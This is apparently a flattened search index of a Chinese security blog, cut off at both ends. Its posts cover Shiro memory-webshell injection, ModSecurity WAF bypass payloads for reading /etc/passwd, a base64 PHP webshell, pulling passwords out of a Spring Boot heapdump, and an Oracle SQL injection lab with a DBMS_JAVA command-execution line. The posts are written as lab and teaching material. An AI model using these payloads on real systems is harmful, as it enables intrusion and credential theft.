nstaff9633109:56classesdrwxr-xr-x3bin4xinstaff9633109:56generated-sourcesdrwxr-xr-x3bin4xinstaff9633109:56generated-test-sourcesdrwxr-xr-x3bin4xinstaff9633109:56maven-archiverdrwxr-xr-x3bin4xinstaff9633109:56maven-statusdrwxr-xr-x3bin4xinstaff9633109:56test-classes-rw-r--r--1bin4xinstaff6049701933109:56ysoserial-0.0.6-SNAPSHOT-all.jar-rw-r--r--1bin4xinstaff19380433109:56ysoserial-0.0.6-SNAPSHOT.jar至此，我们看到已经构建出0.0.6版本的jar包。0x02：总结#牢骚太盛防肠断，风物长宜放眼量。1、MVN源码构建导入lib库；2、修改POM文件对应的依赖。以上。"
  },

  {
    "title"    : "基于内存的Shiro框架Webshell攻击研究",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/",
    "date"     : "Mar 10, 2021",
    "content"  : "基于内存的Shiro框架Webshell攻击研究✅Shiro框架部署IDEAtomcat调试部署dockercompose✅Shiro框架攻击手动poc工具poc✅基于tomcat的通用回显tomcat冰蝎内存马利用原理攻击测试✅给👴连！零：Shiro框架部署现如今部署一个靶场的方法有很多，取决于个人喜好和需求；我结合个人能力做出了一些总结：特点\\部署办法docker-composeIDEAtomcat调试部署Docker+IDEA快捷程度几条命令快捷部署需开放调试端口+tomcatwar包(如无则需源码构建)你懂的能否调试❎✅✅自定义靶场（如页面）❎✅✅#0x01：IDEAtomcat调试部署本篇文章会侧重描述如何进行针对IDEA的tomcat调试部署；克隆源码以shiro-721为例：gitclonehttps://github.com/apache/shiro.gitcdshirogitcheckoutshiro-root-1.4.1mvninstallcdsamples/webmvninstall找到{path-to-shiro}/samples/web/target目录下的war包复制到tomcatwebapps目录下：$treetarget··│  ├──index.jsp│  ├──login.jsp│  ├──logout.jsp│  └──style.css├──samples-web-1.4.1.war$cpsamples/web/target/samples-web-1.4.1.war{path-to-tomcat}/webapps/开放tomcat调试端口：找到bin/catalina.sh文件中的JAVA_OPTS（会有多个），修改如下：JAVA_OPTS=\"$JAVA_OPTS$JSSE_OPTS\"#RegistercustomURLhandlers#DothisheresocustomURLhandles(specifically'war:...')canbeusedinthesecuritypolicyJAVA_OPTS=\"$JAVA_OPTS-Djava.protocol.handler.pkgs=org.apache.catalina.webresources\"CATALINA_OPTS=\"-Xdebug-Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=y\"#上面的CATALINA_OPTS为新增；address为调试端口，可自行更改。bin/startup.sh启动，看到以下日志打印则开放调试成功：$tail-flogs/catalina.outListeningfortransportdt_socketataddress:555510-Mar-202109:51:16.763信息[main]org.apache.catalina.startup.VersionLoggerListener.logServer.服务器版本:ApacheTomcat/8.5.57···10-Mar-202109:51:16.769信息[main]org.apache.catalina.startup.VersionLoggerListener.log命令行参数：-Xdebug10-Mar-202109:51:16.769信息[main]org.apache.catalina.startup.VersionLoggerListener.log命令行参数：-Xrunjdwp:transport=dt_socket,address=5555,suspend=n,server=yIDEA+tomcat调试：IDEA配置（添加server时为TomcatServer-&gt;Remote）：如下图，加上home.jsp断点后进行http请求，可以看到IDEA中返回的frames详情；这样基本上一个基本的IDEA+tomcat的调试配置过程基本就完成了，当然，这只是调试前的准备工作，大家多练习几次，基本上就能够熟练掌握；而最重要的以及最难的其实是调试阶段，调试过程中的一些技巧和能力是在一次次的实践中沉淀下来的，在这里仅仅当作抛砖引玉，不做赘述。#0x02：dockercompose部署准备工作根据不同操作系统下载安装docker；安装python-&gt;pip-&gt;docker-compose，教程自行搜索:)下载靶场vulhubbasedondocker：$gitclonehttps://github.com/vulhub/vulhub.git$cdvulhub/shiro/CVE-2016-4437/$docker-composeup-d等待启动即可。一：Shiro框架攻击poc代码生成攻击cookie可以参考之前的文章：1x01：手动poc分享：DifferentShiroFrameworkdeserializationanalysisideas#howtopoc1x02：工具poc分享：DifferentShiroFrameworkdeserializationanalysisideas#验证二：基于tomcat的通用回显之冰蝎内存马这一小节由于个人水平有限，不能像各位师傅一样从tomcatservlet等层面一探究竟，我尽量使用简洁的语言写出我的理解；#2x01：攻击测试工具直接选择”冰蝎2_Tomcat”，执行注入；http发包请求如下：我们可以看到HTTP请求为POST请求p&amp;path&amp;dy数据；同时header中加入了rememberMeCookie；分析：Cookie是作为反序列化的入口，dy参数应该是写入内存的命令同时最后返回dynamicinjectsuccess；注入成功效果：#2x02：利用原理我们把利用工具的jar包扔进反编译软件定位到BehOldDemoServlert.class，我们来看看代码是怎么工作的：publicvoiddynamicAddServlet(ServletContextservletContext)throwsException{Methodmethod;StringwrapperName=this.path;ApplicationContextFacadeapplicationContextFacade=(ApplicationContextFacade)servletContext;FieldapplicationContextField=applicationContextFacade.getClass().getDeclaredField(\"context\");applicationContextField.setAccessible(true);ApplicationContextapplicationContext=(ApplicationContext)applicationContextField.get(applicationContextFacade);FieldstandardContextField=applicationContext.getClass().getDeclaredField(\"context\");standardContextField.setAccessible(true);StandardContextstandardContext=(StandardContext)standardContextField.get(applicationContext);ObjectnewWrapper=invoke(standardContext,\"createWrapper\",(Object[])null);invoke(newWrapper,\"setName\",newObject[]{wrapperName});setFieldValue(newWrapper,\"instance\",this);Class&lt;?&gt;containerClass=Class.forName(\"org.apache.catalina.Container\",false,standardContext.getClass().getClassLoader());ObjectoldWrapper=invoke(standardContext,\"findChild\",newObject[]{wrapperName});if(oldWrapper!=null)standardContext.getClass().getDeclaredMethod(\"removeChild\",newClass[]{containerClass});standardContext.getClass().getDeclaredMethod(\"addChild\",newClass[]{containerClass}).invoke(standardContext,newObject[]{newWrapper});try{method=standardContext.getClass().getMethod(\"addServletMappingDecoded\",newClass[]{String.class,String.class});}catch(Exceptionvar9){method=standardContext.getClass().getMethod(\"addServletMapping\",newClass[]{String.class,String.class});}method.invoke(standardContext,newObject[]{this.path,wrapperName});init((ServletConfig)getFieldValue(newWrapper,\"facade\"));}"
  },

  {
    "title"    : "Mod-Waf-Bypass-Walkthrough",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Mod-Waf-Bypass-Walkthrough/",
    "date"     : "Jan 10, 2021",
    "content"  : "「分享」ModsecWAF：老牌开源waf的绕过历程零：连喊三声「WAF」0x01拿来WAF依稀记得高中的一位物理老师的一段话，就拿这段话来开始吧；背景是当时刚学物理课程，很多人学会物理公式仅限于会用，他们在课堂上对我们的物理老师表达出了焦虑。当然，研究生学历的物理老师对于这种学习上的困扰必然是经历过，然后提出了下面的观点，原话记不太清了，所以只能大概表述出意思：我知道你们现在有些迷茫，当然也是正常的。但是你们要想在某些领域上有所建树、突破，就要学会站在巨人的肩膀上看这个世界，鲁迅提出的拿来主义我觉得很适合用来学物理；不管这些物理公式为什么是这样的、怎么得来的，先拿来用。「拿来主义」：是民国时期面对外来文化的冲击和中国封建时代遗留下来的文化，如何选择和取舍，于当时中国流行的闭关主义和全面西化的不同呼声；鲁迅主张，既非被动地被“送去”，亦非不加分析地“拿来”，而是通过实用主义的观点选择性的“拿来”。所以我想：针对WAF也可以这样来学习，不知道WAF的工作原理没有关系，我们先把开源的WAF拿过来用，用了才知道WAF的优点、缺点；同样的：只有用过之后，我们看到拦截日志后可以知道WAF的正则表达规则库，可以对WAF的工作方式有一些了解。0x02部署WAF#Apache部署进一步了解：APACHE中间件链接ModSec没什么好说的，跟着教程一步步走基本上都能搞定。直接上部署成功的图：如上图，部署成功后可以看到访问http://localhost?doc=/bin/ls，WAF给出拦截操作，日志记录提示触发了unix-shell.data规则导致拦截返回403；#Nginx部署进一步了解：Nginx中间件链接ModSec同样的：访问localhost:8011/?and1=2--+，触发WAF拦截规则返回403；需要注意的是：nginx版本，教程中推荐的1.9版本实际操作下来无法成功编译安装，这里推荐nginx/1.13.8wgethttp://nginx.org/download/nginx-1.13.8.tar.gz环境lib库安装：sudoapt-getinstallopenssllibssl-devlibpcre3libpcre3-devzlib1g-devautoconfautomakelibtoolgccg++make#[tips]以下四条命令的含义：$sed-ie's/SecDefaultAction\"phase:1,log,auditlog,pass\"/#SecDefaultAction\"phase:1,log,auditlog,pass\"/g'crs-setup.conf$sed-ie's/SecDefaultAction\"phase:2,log,auditlog,pass\"/#SecDefaultAction\"phase:2,log,auditlog,pass\"/g'crs-setup.conf$sed-ie's/#.*SecDefaultAction\"phase:1,log,auditlog,deny,status:403\"/SecDefaultAction\"phase:1,log,auditlog,deny,status:403\"/g'crs-setup.conf$sed-ie's/#SecDefaultAction\"phase:2,log,auditlog,deny,status:403\"/SecDefaultAction\"phase:2,log,auditlog,deny,status:403\"/g'crs-setup.conf将下面查看crs-setup.conf文件输出中1、2行（下文2、3行）的内容注释，文件中5、6行（下文6、7行）取消注释；catcrs-setup.conf|grepSecDefaultAction#SecDefaultAction\"phase:1,log,auditlog,pass\"#SecDefaultAction\"phase:2,log,auditlog,pass\"#SecDefaultAction\"phase:1,nolog,auditlog,pass\"#SecDefaultAction\"phase:2,nolog,auditlog,pass\"SecDefaultAction\"phase:1,log,auditlog,deny,status:403\"SecDefaultAction\"phase:2,log,auditlog,deny,status:403\"#SecDefaultAction\"phase:1,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host:%{request_headers.host}'\"#SecDefaultAction\"phase:2,log,auditlog,redirect:'http://%{request_headers.host}/',tag:'Host:%{request_headers.host}'\"其他根据教程往下走即可。0x03绕过WAF#未初始变量进行绕过跟随大佬们的脚步走，使用简单的php代码进行WAF测试：&lt;?phpif(isset($_GET['host'])){system('dig'.$_GET['host']);}?&gt;如上代码尝试绕过WAF。我们知道终端执行digwww.baidu.com;cat/etc/passwd实际执行如下：digwww.baidu.com;cat/etc/passwd;&lt;&lt;&gt;&gt;DiG9.10.6&lt;&lt;&gt;&gt;www.baidu.com;;globaloptions:+cmd;;Gotanswer:;;-&gt;&gt;HEADER&lt;&lt;-opcode:QUERY,status:NOERROR,id:27659;;flags:qrrd;QUERY:1,ANSWER:3,AUTHORITY:5,ADDITIONAL:4;;WARNING:recursionrequestedbutnotavailable·········#OpenDirectory.##nobody:*:-2:-2:UnprivilegedUser:/var/empty:/usr/bin/false····_oahd:*:441:441:OAHDaemon:/var/empty:/usr/bin/false在终端下相同作用的链接符号还有&amp;&amp;；直接传参www.baidu.com;cat+/etc/passwd注入明显的攻击行为直接返回403，查看日志匹配到以下特征：1、\"OperatorRx'withparameter^[\\d.:]+$'againstvariable，存在运算符；2、OperatorPmFromFile'withparameterlfi-os-files.data'，正则匹配到lfi-os-files的规则库；3、charactersomitted，特殊字符；4、\"OperatorPmFromFile'withparameterunix-shell.data'，正则匹配到unix-shell的规则库；5、OperatorGe'withparameter5'，同样为存在运算符。所以根据以上特征进行规则探测并注入fuzz：+$u+cat+/$uetc/$upasswd$u+$ucat+$u/etc$u/passwd以上都返回200，但是没有回显，说明命令写的不对；实际测试/etc、/passwd和特殊字符等不能单独出现，所以使用未初始变量$u包住后进行注入；下面是实际生效的payload：+$u+cat+/etc$u/passwd$u+$u+cat+$u/etc$u/passwd一：编写poc脚本连接器通过以上绕过首发即可执行任意代码，我们可以直接写入一句话木马，但是这不是本段的重点；本段的重点是通过实际测试发现base64编码后可以完美绕过waf，所以可以直接写入一个base64的马，然后连接，实际上就是解决实现一个webshell连接器，实现功能类似一个蚁剑的cmd连接功能；这样以来WAF就形同虚设了。webshell代码：&lt;?phpsystem(base64_decode($_GET['CMD']));?&gt;GET/POST请求传入cmdbase64加密参数内容类似终端执行代码实现效果如下：参考的是[@IppSec]的代码，简单修改了部分。参考代码以上"
  },

  {
    "title"    : "Dynamic-analysis-of-java-framework-code",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Dynamic-analysis-of-java-framework-code/",
    "date"     : "Dec 30, 2020",
    "content"  : "零：[debug]theworlddebug基本用法介绍debug的几个分类断点介绍分类断点的使用debug简单例子演示以SHIRO框架来进行动态java代码调试分析0x01：debug的基本用法0x02：debug实现linebreakpoints了解了怎么调试后，第一步：debugtheworld。1.新建程序打开开发软件(intelliJIDEA或者eclipse)新建projectnew一个classhello.java:publicclasshello{publicstaticvoidmain(String[]args){System.out.println(\"thisisablocktestmessage\");System.out.println(\"helloworld\");}}2.运行程序${path-to-project}/hello/src/hello.java-右键-runhello.main()console台输出即程序运行成功：······thisisablocktestmessagehelloworldProcessfinishedwithexitcode03.调试程序实现现象：1)程序输出thisisablocktestmessage后停下2)人工干预后输出helloworld就这样我们就可以在对一个简单的java程序进行进程断点后，我们就能够对程序的输出的进度可控。二：断点用法0x01："
  },

  {
    "title"    : "SpringBoot-Memory-files-heapdump-Analysis",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/SpringBoot-Memory-files-heapdump-Analysis/",
    "date"     : "Nov 24, 2020",
    "content"  : "思路：heapdump文件分析历程本文通过下面三个问题进行技术分享：在哪些地方可以发现？关于SpringBoot的一些参考SpringBoot框架渗透参考发现了怎么找到她？heapdump文件下载路由springbootv1版本：https://url-to-spring-boot-error/heapdumpspringbootv2版本：https://url-to-spring-boot-error/actuator/heapdump实际情况中不同的生产环境有所差异，所以建议针对actuator结点作为分割点来进行判别，即标识错误页面出现的路由来进行层级爆破，若没有分割点即springbootv1版本则往前递推一个路由即可。找到了怎么使用？文件分析分析工具MAT分析语法分析零：Spring—Boot框架的渗透过程上面已经给出相关访问url，文章中的转载地址也详细给出，一般能够识别Spring-Boot的框架特征就行了，不再赘述。本篇文章主要是针对heapdump文件进行分析；在这里做一下简单的介绍：零：路由和版本0x01：路由知识0x02：版本知识一：信息泄露0x01：路由地址及接口调用详情泄漏0x02：配置不当而暴露的路由0x03：获取被星号脱敏的密码的明文二：远程代码执行0x01：whitelabelerrorpageSpELRCE0x02：springcloudSnakeYAMLRCE0x03：eurekaxstreamdeserializationRCE0x04：jolokialogbackJNDIRCE0x05：jolokiaRealmJNDIRCE0x06：h2databasequeryRCE0x07：h2databaseconsoleJNDIRCE0x08：mysqljdbcdeserializationRCE一：历史SpringBoot框架渗透在简单认识SpringBoot框架后，至少在我看来，我们所需要了解的是框架的路由、特征信息，以方便我们来识别；当然，自己搭建一遍对于框架的认识自不必多说。而在我看来，仅仅一篇博客的简单描述并不能一言概全，而且由于安全行业的特殊性，我们更需要的是脚踏实地的实践精神，所以在此写下博客的同时，回忆SRC的相关案例；权当抛砖引玉1x01金融行业某银行系统由于时间较为久远，细节部分无法详尽贴出，但是不妨碍整体完整性；为了保护SRC平台客户隐私，所有的路由、ip全部都使用可理解的标签代替。见谅。SRC任务是泛域名，就是*.src_target.{com}，基本熟悉的就直接跑域名然后端口对应的服务这样子；子域名发现子域名整理端口批量扫描域名端口批量服务发现过程中发现某银行机构活动登录系统1、登录数据包为json格式2、登录系统端口为8080，后端验证系统服务开放端口为8086，路由如下：登录：http://{Vuln_Address}:8080/user/login?redirect=%2F验证数据交互：http://{Vuln_Address}:8086/{api_interface_url}/sys/login/访问后端8086开放服务url：http://{Vuln_Address}:8086/{api_interface_url}/发现返回404，返回信息如下：json格式：{\"timestamp\":\"2021-01-29T07:26:34.085+0000\",\"status\":404,\"error\":\"NotFound\",\"message\":\"Nomessageavailable\",\"path\":\"/\"}html格式：&lt;html&gt;&lt;body&gt;&lt;h1&gt;WhitelabelErrorPage&lt;/h1&gt;&lt;p&gt;Thisapplicationhasnoexplicitmappingfor/error,soyouareseeingthisasafallback.&lt;/p&gt;&lt;divid='created'&gt;FriJan2915:25:38CST2021&lt;/div&gt;&lt;div&gt;Therewasanunexpectederror(type=NotFound,status=404).&lt;/div&gt;&lt;div&gt;Nomessageavailable&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;很明显的SpringBoot框架，连路由都不需要爆破直接找未授权接口：It'sASpringBootWebAPP:http://{Vuln_Address}:8086/目标站点开启了env端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/env目标站点开启了jolokia端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/jolokia/list目标站点开启了jolokia端点且存在createJNDIRealm方法,可进行JNDI注入RCE测试,路径为：http://{Vuln_Address}:8086//actuator/jolokia/list目标站点开启了beans端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/beans目标站点开启了configprops端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/configprops目标站点开启了health端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/health目标站点开启了info端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/info目标站点开启了mappings端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/mappings目标站点开启了metrics端点的未授权访问,路径为：http://{Vuln_Address}:8086//actuator/metrics---It'sASpringBootWebAPP:http://{Vuln_Address}:8086/{api_interface_url1}/actuator目标站点开启了env端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/env目标站点开启了jolokia端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/jolokia/list目标站点开启了jolokia端点且存在createJNDIRealm方法,可进行JNDI注入RCE测试,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/jolokia/list目标站点开启了beans端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/beans目标站点开启了configprops端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/configprops目标站点开启了health端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/health目标站点开启了info端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/info目标站点开启了mappings端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/mappings目标站点开启了metrics端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url1}/actuator/metrics---It'sASpringBootWebAPP:http://{Vuln_Address}:8086/{api_interface_url2}/actuator目标站点开启了env端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/env目标站点开启了jolokia端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/jolokia/list目标站点开启了jolokia端点且存在createJNDIRealm方法,可进行JNDI注入RCE测试,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/jolokia/list目标站点开启了beans端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/beans目标站点开启了configprops端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/configprops目标站点开启了health端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/health目标站点开启了info端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/info目标站点开启了mappings端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/mappings目标站点开启了metrics端点的未授权访问,路径为：http://{Vuln_Address}:8086/{api_interface_url2}/actuator/metrics而我们从上面信息可知，存在的SpringBoot路由分别为：根目录/、{api_interface_url1}、{api_interface_url2}，所以言归正传，返回到我们的主角：heapdump下载路径即：http://{Vuln_Address}:8086/actuator/heapdumphttp://{Vuln_Address}:8086/{api_interface_url1}/actuator/heapdumphttp://{Vuln_Address}:8086/{api_interface_url2}/actuator/heapdump当然，所有的渗透操作都是在此端口上进行；继续往下。二：HEAPDUMP文件分析历程文件信息如下：%filesrc-1520-heapdumpsrc-1520-heapdump:JavaHPROFdump,createdMonOct1211:14:252020FileViewer:2x01分析工具MATOQL是用于查询Java堆的类SQL查询语言。OQL允许过滤/选择从Java堆中获取的信息；虽然HAT已经支持预定义的查询，例如“显示类X的所有实例”，但OQL增加了更多的灵活性；OQL基于JavaScript表达式语言。打开MAT选择打开headump文件，打开加载完毕选择OQL执行；2x02分析语法select&lt;JavaScriptexpressiontoselect&gt;[from[instanceof]&lt;classname&gt;&lt;identifier&gt;[where&lt;JavaScriptbooleanexpressiontofilter&gt;]]部分OQL分析语句实例展示：select*fromjava.util.LinkedHashMap$EntryxWHERE(toString(x.key).contains(\"password\"))选择寻找hashmap中所有key元素中存在password值并展示出，如下所示自不必多说：select*fromorg.springframework.web.context.support.StandardServletEnvironment选择寻找所有StandardServletEnvironment并展示出，这一项中我们需要关注的是propertySourceList(简称PPSlist)，查找链如下：PPS-PPSlis-array-org.springframework.core.env.PPS-source-tables，tables中存储的即为我们所关注的敏感信息，如下所示：select*fromjava.util.Hashtable$EntryxWHERE(toString(x.key).contains(\"password\"))选择寻找哈希表中所有key元素中存在password值并展示出：本文中展示的分析OQL语句实例供参考，实际可是写出的有很多，经过自己理解后可以自行尝试编写实践。参考JDK1.8源码(九)——java.util.LinkedHashMap类Map综述（二）：彻头彻尾理解LinkedHashMapMAT查找springheapdump中的密码明文以上"
  },

  {
    "title"    : "《舌尖上的中国》经典解说词",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2020/daily-post-test-article/",
    "date"     : "Nov 11, 2020",
    "content"  : "东方和西方，江南和塞北。人们的迁徙促成了食物的相逢，食物的离合见证了人的聚散。半身闯荡，带来家业丰厚，儿孙满堂，行走一生的脚步，起点，终点，归根到底都是家所在的地方，这是中国人秉持千年的信仰，朴素，但有力量。在厨房里，五味的最佳存在方式，并不是让其中有某一味显得格外突出，而是五味的调和以及平衡，不仅是中国历代厨师和中医不断寻求的完美状态，也是中国在为人处世、甚至在治国经世上所追求的理想境界。传承中国文化的不仅仅是唐诗宋词京剧昆曲，它包含着与我们生活相关的每一个细节。一勺鱼酱，足以让最平常的食材陡然变得酸楚动人，这是一年中最美味的团聚，也注定是一顿百感交集的晚餐。"
  },

  {
    "title"    : "Struts2Deser",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Struts2Deser/",
    "date"     : "Nov 7, 2020",
    "content"  : "分享：Struts2反序列化SHIRO框架简介以及相关用途✅简介：关于STRUTS2的历史和相关实现组件✅用途：STRUTS2框架的使用场景和解决痛点反序列化分析✅JAVA代码反序列化FRAMES✅调试环境部署为什么写这样的代码❎开发者写这样代码的用意❎开发者如何修复反序列化实战✅利用表达式计算注入执行代码✅最终目标：GETSHELL"
  },

  {
    "title"    : "SQL注入原理分析",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ALL-SQL-INJECTION-ANALYSIS/",
    "date"     : "Oct 29, 2020",
    "content"  : "SQL注入原理分析：全类型数据库靶场搭建零：Oracle数据库注入靶场搭建使用docker进行oracle数据库渗透测试，测试环境拓扑如下：0x01：Oracle服务启动#Oracle数据库配置一览数据库镜像启动#docker下载oracle数据库镜像dockerpullregistry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g#docker将镜像加载到名称为oracle的容器后台运行，并映射镜像1521端口到本地1521端口dockerrun-d-p1521:1521--nameoracleregistry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g#进入oracle容器的交互式shelldockerexec-itoraclebashroot@bd849e50bab4:/#sqlplus/nologSQL&gt;connsys/oracleassysdbaConnected.SQL&gt;selectnamefromv$database;NAME---------XE新增用户赋权+建库#开辟空间建库SQL&gt;createtablespacepentestdatafile'/tmp/pentest.dbf'size100m;Tablespacecreated.#创建pentest用户，密码pentest；默认table是pentestSQL&gt;createuserpentestidentifiedbypentestdefaulttablespacepentest;Usercreated.#赋权pentest-connect,resource,dbaSQL&gt;grantconnect,resource,dbatopentest;Grantsucceeded.SQL&gt;exitDisconnectedfromOracleDatabase11gExpressEditionRelease11.2.0.2.0-64bitProduction#pentest用户连接root@bd849e50bab4:/#sqlpluspentest/pentestSQL*Plus:Release11.2.0.2.0ProductiononFriFeb1906:38:042021Copyright(c)1982,2011,Oracle.Allrightsreserved.Connectedto:OracleDatabase11gExpressEditionRelease11.2.0.2.0-64bitProduction插入测试数据#建表SQL&gt;CREATETABLEusers(idnumber,namevarchar(500),surnamevarchar(1000));Tablecreated.#导入数据SQL&gt;INSERTINTOusers(id,name,surname)VALUES(1,'luther','blisset');INSERTINTOusers(id,name,surname)VALUES(2,'fluffy','bunny');INSERTINTOusers(id,name,surname)VALUES(3,'wu','ming');INSERTINTOusers(id,name,surname)VALUES(4,'sqlmap/1.0-dev(http://sqlmap.org)','useragentheader');INSERTINTOusers(id,name,surname)VALUES(5,NULL,'nameisnull');commit;1rowcreated.SQL&gt;1rowcreated.SQL&gt;1rowcreated.SQL&gt;1rowcreated.SQL&gt;1rowcreated.SQL&gt;commit;Commitcomplete.SQL&gt;SELECT*FROMuserswhereid=1;\tID----------NAME--------------------------------------------------------------------------------SURNAME--------------------------------------------------------------------------------\t1lutherblisset0x02：WEB服务启动#APACHE+PHP+ORACLEdocker镜像拉取dockerpullthomasbisignani/docker-apache-php-oraclecd~/learn/dockermkdiroracle_samplePages&amp;&amp;cdoracle_samplePagestouchindex.php##########配置docker-apache-php-oracle这个镜像启动时：##1、-v:宿主机文件夹/Users/bin4xin/learn/docker/oracle_samplePages中文件可在虚拟机文件夹/var/www/html中被访问到；即：########宿主机/Users/bin4xin/learn/docker/oracle_samplePages文件夹为docker-apache-php-oracleweb服务的根目录##2、-p:映射docker80端口到本机的8090端口下；##3、-d:后台运行########dockerrun-p8090:80-d-v/Users/bin4xin/learn/docker/oracle_samplePages:/var/www/htmlthomasbisignani/docker-apache-php-oraclephp连库代码catindex.php&lt;?php$username='pentest';$password='pentest';$connectText='//127.0.0.1:1521/XE';$conn=oci_connect($username,$password,$connectText);if(!$conn){$e=oci_error();echo'Oracleconnectfailed&lt;br/&gt;';exit($e['message']);}echo'Oracleconnectok'.\"&lt;br&gt;\";?&gt;PHP靶场SQL注入代码&lt;?php$username='pentest';$password='pentest';$connectText='//127.0.0.1:1521/XE';$conn=oci_connect($username,$password,$connectText);if(!$conn){$e=oci_error();echo'Oracleconnectfailed&lt;br/&gt;';exit($e['message']);}echo'Oracleconnectok'.\"&lt;br&gt;\";//Preparethestatementif(!isset($_GET['id'])||$_GET['id']==null){echo\"oraclesqlinjectiontest:oracle_test.php?id=1&lt;/br&gt;\";$stid=oci_parse($conn,\"select*fromUSERS\");}else{//SQLinjection!!!!!!$stid=oci_parse($conn,\"SELECT*FROMuserswhereid=\".$_GET['id']);}if(!$stid){$e=oci_error($conn);exit($e['message']);}//Performthelogicofthequery$r=oci_execute($stid);if(!$r){$e=oci_error($stid);exit($e['message']);}//Fetchtheresultsofthequeryprint\"&lt;tableborder='1'&gt;\\n\";while($row=oci_fetch_array($stid,OCI_ASSOC+OCI_RETURN_NULLS)){print\"&lt;tr&gt;\\n\";foreach($rowas$item){$item=($item!==null?mb_convert_encoding($item,'utf-8','gbk'):\"\");print\"&lt;td&gt;\".$item.\"&lt;/td&gt;\\n\";}print\"&lt;/tr&gt;\\n\";}print\"&lt;/table&gt;\\n\";oci_free_statement($stid);oci_close($conn);?&gt;#连库成功效果图0x03：SQL注入靶场启动至此，注入靶场搭建完毕。SQLMAP注入效果：渗透常用语句：#当前用户权限select*fromsession_roles#当前数据库版本selectbannerfromsys.v_$versionwhererownum=1#服务器出口IP用utl_http.request可以实现#服务器监听IP地址selectutl_inaddr.get_host_addressfromdual#服务器操作系统selectmemberfromv$logfilewhererownum=1#服务器sid查询，远程连接的话需要selectinstance_namefromv$instance;#当前连接用户selectSYS_CONTEXT('USERENV','CURRENT_USER')fromdual命令执行：SelectDBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pingojuht0.dnslog.cn')fromdual;以上。"
  },

  {
    "title"    : "有关于网络安全行业的一些思考",
    "category" : "",
    "tags"     : "笔记",
    "url"      : "/blog/2020/thinking-about-net-Cyber-Security/",
    "date"     : "Sep 25, 2020",
    "content"  : "Underconstruction在当今网络安全行业趋于商业化的时代，如何能够保持一颗赤忱之心：当今网络安全之趋势，当在国家安全的大前提下：教育行业应作为网络安全的”活水源头”，为这个年轻的行业输入足够的年轻血液，所以在此刻：应当充分发挥教育职能的同时，对当下应用型、研究型专业的莘莘学子做有必要的引导；因为当下很多学生、教师在当下行业无法认清自我，永远无法在正确的时间，做正确的事；企业在这其中也扮演重要角色：显而易见的是，传统安全企业也面临着的抉择：适应市场或者是自己选择游戏规则；大部分传统安全厂商选择的是适应市场安服需求；夺旗需求；应付工信部门检查等。。。爱加密等厂商：自己创造需求，创造游戏规则。对处于实习期的学生做好职业引导，网络安全行业在未来十年不会成为国家命脉行业，安全行业仅仅作为安全服务的形式为大众所熟知，如今的网络安全行业：国家层面：CTF赛事；护网行动；重大节日保障企业层面：工信局部门检查；等保；自身企业业务安全保障(一般来说，越针对自身企业业务有安全需求的公司，都拥有自己的安全团队)个人层面：个人数据、隐私、财产问题；零、当下网络安全行业CTF赛事之我见oopos！被你发现了！it工作人员（包括运维、开发等等）公司内的矛盾软件开发和传统安全公司之间的矛盾网络防火墙作为访问控制设备，主要工作在OSI模型三、四层，基于IP报文进行检测。只是对端口做限制，对TCP协议做封堵。其产品设计无需理解HTTP会话，也就决定了无法理解Web应用程序语言如HTML、SQL语言。因此，它不可能对HTTP通讯进行输入验证或攻击规则分析。针对Web网站的恶意攻击绝大部分都将封装为HTTP请求，从80或443端口顺利通过防火墙检测。一些定位比较综合、提供丰富功能的防火墙，也具备一定程度的应用层防御能力，如能根据TCP会话异常性及攻击特征阻止网络层的攻击，通过IP分拆和组合也能判断是否有攻击隐藏在多个数据包中，但从根本上说他仍然无法理解HTTP会话，难以应对如SQL注入、跨站脚本、cookie窃取、网页篡改等应用层攻击。web应用防火墙能在应用层理解分析HTTP会话，因此能有效的防止各类应用层攻击，同时他向下兼容，具备网络防火墙的功能。"
  },

  {
    "title"    : "不得不谈的：「Spring Boot」未授权渗透",
    "category" : "",
    "tags"     : "src, CVE, 信息搜集, 笔记",
    "url"      : "/blog/2020/spring-boot-vuln-summary/",
    "date"     : "Sep 25, 2020",
